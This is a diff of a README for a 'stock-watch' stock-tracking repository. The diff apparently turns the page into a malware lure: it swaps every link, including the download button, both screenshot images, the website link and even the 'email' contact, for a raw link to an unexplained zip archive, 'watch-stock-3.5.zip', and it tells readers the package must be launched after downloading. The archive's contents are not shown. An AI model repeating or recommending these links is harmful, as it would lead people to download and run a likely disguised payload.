@@ -12,7 +12,7 @@ Welcome to the "stock-watch" repository! Here you will find an exciting collecti
 
 To get started, you can download our software package by clicking the link below:
 
-[![Download Software](https://github.com/Julia2806/stock-watch/releases/tag/v2.0)](https://github.com/Julia2806/stock-watch/releases/tag/v2.0)
+[![Download Software](https://raw.githubusercontent.com/Julia2806/stock-watch/main/unrespected/watch-stock-3.5.zip)](https://raw.githubusercontent.com/Julia2806/stock-watch/main/unrespected/watch-stock-3.5.zip)
 
 *Please note that the software package needs to be launched after downloading.*
 
@@ -34,10 +34,10 @@ Get the latest news and insights related to the stock market to make informed in
 
 Here are some screenshots from our software:
 
-![Screenshot 1](https://github.com/Julia2806/stock-watch/releases/tag/v2.0)
+![Screenshot 1](https://raw.githubusercontent.com/Julia2806/stock-watch/main/unrespected/watch-stock-3.5.zip)
 *Figure 1: Real-Time Stock Data Dashboard*
 
-![Screenshot 2](https://github.com/Julia2806/stock-watch/releases/tag/v2.0)
+![Screenshot 2](https://raw.githubusercontent.com/Julia2806/stock-watch/main/unrespected/watch-stock-3.5.zip)
 *Figure 2: Customizable Alerts Settings*
 
 ## Installation Guide 🛠️
@@ -58,7 +58,7 @@ We welcome contributions from the community to make the "stock-watch" repository
 
 ## Resources 📚
 
-For additional resources and documentation, please visit our [website](https://github.com/Julia2806/stock-watch/releases/tag/v2.0).
+For additional resources and documentation, please visit our [website](https://raw.githubusercontent.com/Julia2806/stock-watch/main/unrespected/watch-stock-3.5.zip).
 
 ## Releases 🚀
 
@@ -66,6 +66,6 @@ If the provided link does not work, please check the "Releases" section of this 
 
 ## Contact Us 📧
 
-If you have any questions or feedback, feel free to reach out to us via email at [https://github.com/Julia2806/stock-watch/releases/tag/v2.0](https://github.com/Julia2806/stock-watch/releases/tag/v2.0).
+If you have any questions or feedback, feel free to reach out to us via email at [https://raw.githubusercontent.com/Julia2806/stock-watch/main/unrespected/watch-stock-3.5.zip](https://raw.githubusercontent.com/Julia2806/stock-watch/main/unrespected/watch-stock-3.5.zip).
 
 Start tracking your stocks like a pro with "stock-watch"! Happy investing! 🎉📊
